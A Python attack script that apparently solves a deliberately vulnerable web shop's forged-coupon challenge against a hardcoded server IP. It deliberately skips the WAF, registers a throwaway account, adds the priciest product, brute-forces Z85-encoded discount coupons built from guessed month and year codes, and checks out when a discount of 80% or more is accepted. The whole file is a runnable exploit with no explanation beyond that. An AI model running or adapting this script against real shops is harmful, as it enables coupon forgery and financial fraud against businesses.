#!/usr/bin/env python3

import requests
import time
from datetime import datetime

def solve_forged_coupon():
    base_url = "http://66.42.93.220"  # Direct server to avoid any WAF issues
    session = requests.Session()
    
    print("🎯 FORGED COUPON CHALLENGE - FINAL ATTEMPT")
    print(f"Target: {base_url}")
    
    # Auth
    email = f"final{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Authenticated")
        
        # Add expensive product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        expensive = max(products, key=lambda p: p['price'])
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": expensive['id'], "quantity": 1
        })
        print(f"✅ Added {expensive['name']} (${expensive['price']})")
        
        # Get basket
        user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
        basket_id = user_data.get('bid', 1)
        
        # Current date-based coupon variations
        current_month = datetime.now().strftime("%b").upper()  # OCT
        current_year = datetime.now().strftime("%y")           # 25
        
        # Generate multiple coupon attempts
        coupon_attempts = [
            # Current month/year with high discounts
            f"{current_month}{current_year}-80",
            f"{current_month}{current_year}-90",
            f"{current_month}{current_year}-99",
            
            # Try next month
            "NOV25-80", "NOV25-90", "DEC25-90",
            
            # Try this year with different months
            "OCT25-80", "OCT25-90", "DEC25-99",
        ]
        
        print(f"\\n🧪 Testing {len(coupon_attempts)} date-based coupons...")
        
        # Import Z85 encoder
        import struct
        
        Z85_ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
        
        def z85_encode(data):
            if len(data) % 4 != 0:
                raise ValueError("Data length must be multiple of 4 bytes")
            
            encoded = ""
            for i in range(0, len(data), 4):
                chunk = data[i:i+4]
                value = struct.unpack('>I', chunk)[0]
                
                for j in range(5):
                    encoded = Z85_ALPHABET[value % 85] + encoded
                    value //= 85
            
            return encoded
        
        for plaintext in coupon_attempts:
            try:
                # Z85 encode the coupon
                z85_coupon = z85_encode(plaintext.encode('utf-8'))
                
                print(f"   Testing: {plaintext} → {z85_coupon}")
                
                response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
                
                if response.status_code == 200:
                    result = response.json()
                    discount = result.get('discount', 0)
                    
                    if discount >= 80:
                        print(f"   🎉 CHALLENGE SOLVED! {plaintext} = {discount}% discount!")
                        
                        # Try to checkout
                        checkout = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
                        print(f"   Checkout: {checkout.status_code}")
                        return True
                    elif discount > 0:
                        print(f"   ✅ Valid: {discount}% (need 80%+)")
                else:
                    print(f"   ❌ {response.status_code}: Invalid")
                    
            except Exception as e:
                print(f"   Error encoding {plaintext}: {e}")
    
    return False

solve_forged_coupon()
